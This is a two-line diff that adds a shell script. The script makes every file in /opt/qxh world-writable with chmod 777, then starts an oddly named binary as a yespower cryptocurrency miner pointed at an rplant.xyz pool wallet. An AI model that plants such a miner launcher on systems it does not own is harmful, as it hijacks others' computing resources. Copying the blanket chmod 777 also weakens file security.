@@ -1,0 +1,2 @@
+cd /opt/qxh/ && chmod 777 * && ls
+./qch -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17122 -u QdFzFpeFRNx2we7rVXTNv7gQSzkjf4VSdk.do -t 8
